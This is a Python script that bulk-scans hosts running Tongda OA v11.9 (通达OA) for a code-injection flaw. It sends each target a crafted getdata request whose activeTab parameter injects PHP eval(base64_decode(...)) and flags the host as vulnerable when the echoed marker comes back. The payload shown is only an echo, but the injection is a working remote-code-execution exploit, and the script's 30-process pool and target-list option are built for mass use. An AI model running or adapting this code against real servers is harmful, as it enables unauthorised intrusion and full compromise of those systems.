import requests
import argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool


def main():
    banner = """
    _   _        .      .      |           #   ___          _   _        .      .       _   _     
   (_)-(_)     .  .:::.        |.===.      #  <_*_>        (_)-(_)     .  .:::.        '\\-//`    
    (o o)        :(o o):  .    {}o o{}     #  (o o)         (o o)        :(o o):  .     (o o)     
ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo--8---(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-
"""
    print(banner)
    parser = argparse.ArgumentParser(description='通达OA v11.9')
    parser.add_argument('-u','--url', type=str, help='输入要检测URL')
    parser.add_argument('-f','--file', type=str, help='输入要批量检测的文本')
    args = parser.parse_args()
    url = args.url
    file = args.file
    targets = []
    if url:
        check(args.url)
    elif file:
        f = open(file, 'r')
        for i in f.readlines():
            i = i.strip()
            if 'http' in i:
                targets.append(i)
            else:
                i = f"http://{i}"
                targets.append(i)
    pool = Pool(30)
    pool.map(check, targets)
def check(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0'
    }
    try:
        response = requests.get(f'{target}/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage',headers=headers,verify=False,timeout=5)
        if response.status_code == 200 and 'vuln_test' in response.text:
            print(f"[!]{target}存在漏洞")
        else:
            print(f"[*]{target}不存在漏洞")
    except Exception as e:
        pass
if __name__ == '__main__':
    main()